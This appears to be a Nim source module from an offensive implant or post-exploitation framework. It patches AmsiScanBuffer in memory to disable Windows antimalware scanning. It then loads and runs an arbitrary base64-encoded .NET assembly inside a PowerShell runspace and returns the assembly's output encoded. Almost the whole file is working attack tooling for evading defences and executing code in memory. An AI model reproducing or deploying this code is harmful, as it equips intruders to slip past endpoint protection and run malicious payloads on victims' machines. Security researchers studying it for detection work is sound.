import asyncdispatch
import asyncfile
import dynlib
import byteutils
import winim/lean
import sugar
import winim/clr except `[]`
import shlex
import nimcrypto
import nimcrypto/sysrand
import base64
import os
import osproc
import strformat
import strutils

const iv: array[aes256.sizeBlock, byte] = [byte 55, 19, 19, 173, 190, 70, 130,254, 26, 241, 14, 4, 213, 94, 108, 237]
const envkey: string = "TARGETDOMAIN"

func toByteSeq*(str: string): seq[byte] {.inline.} =
    # Converts a string to the corresponding byte sequence
    @(str.toOpenArrayByte(0, str.high))

proc dup(oldfd: FileHandle): FileHandle {.importc, header: "unistd.h".}
proc dup2(oldfd: FileHandle, newfd: FileHandle): cint {.importc, header: "unistd.h".}

let tmpFileName="tmpFile.txt"

template captureStdout*(ident: untyped, body: untyped) =
  var stdout_filehandle = stdout.getFileHandle()
  # Duplicate stdout_filehandle
  var stdout_dupfh = dup(stdout_filehandle)
  echo stdout_dupfh
  # create a new file
  var tmp_file = open(tmpFileName, fmReadWrite)
  # Get the FileHandle (the file descriptor) of your file
  var tmp_file_fh: FileHandle = tmp_file.getFileHandle()
  # dup2 tmp_file_fh to stdout_filehandle -> writing to stdout_filehandle now writes to tmp_file
  discard dup2(tmp_file_fh, stdout_filehandle)
  body
  tmp_file.flushFile()
  tmp_file.close()
  ident = readFile(tmpFileName)
  discard dup2(stdout_dupfh, stdout_filehandle)

proc PatchAmsi(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    when defined amd64:
        echo "[*] Running in x64 process"
        const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        echo "[*] Running in x86 process"
        const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

    amsi = loadLib("amsi")
    if isNil(amsi):
        echo "[-] Failed to load amsi.dll"
        return disabled

    cs = amsi.symAddr("AmsiScanBuffer")
    if isNil(cs):
        echo "[-] Failed to get the address of 'AmsiScanBuffer'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true
    
    return disabled

proc execute_assembly*(assembly_b64: string, assembly_args: string): (bool, string) =
    var is_success: bool
    var output = "\n"
    try:
        var Automation = load("System.Management.Automation")
        var RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")
        var runspace = @RunspaceFactory.CreateOutOfProcessRunspace(nil)
        runspace.Open()
        var pipeline = runspace.CreatePipeline()
        pipeline.Commands.AddScript(fmt"""
        $assembly_b64 = "{assembly_b64}"
        $assembly_args = "{assembly_args}"
        $assembly_bytes = [System.Convert]::FromBase64String($assembly_b64)
        $assembly = [Reflection.Assembly]::Load($assembly_bytes)
        $params = @(,[String[]]$assembly_args.Split(" "))
        $Writer = [System.IO.StringWriter]::new()
        $Writer.flush()
        $OriginalOut = [System.Console]::Out
        [System.Console]::SetOut($Writer)
        $temp = $assembly.EntryPoint.invoke($null, $params)
        $Writer.GetStringBuilder().ToString()
        [System.GC]::Collect()
        """)
        pipeline.Commands.Add("Out-String")
        var results = pipeline.Invoke()
        for i in countUp(0, results.Count()-1):
            output.add($results.Item(i))
        runspace.Close()
        runspace.Dispose()
        is_success = true
    except:
        is_success = false
        let
            e = getCurrentException()
            msg = getCurrentExceptionMsg()
        echo "Got exception ", repr(e), " with message ", msg
    return (is_success, output)

proc execute*(contents: string, args: string, totalchunks: int): Future[string] {.async.} =
    echo "We got a total of chunks: ", totalchunks
    var inFile: string = $(contents)
    var parameters = args
    var passkeystr: string = envkey
    var contents: string = ""
    contents = decode(inFile)

    var success = PatchAmsi()
    echo fmt"[*] AMSI disabled: {bool(success)}"
    if not success:
        echo "[-] AMSI not disabled:"
        quit()

    echo "[*] .NET versions"
    for v in clrVersions():
        echo v
    echo "\n"
    var output = "\n"
    var succ: bool
    (succ, output) = execute_assembly(contents, parameters)
    result = encode(output)
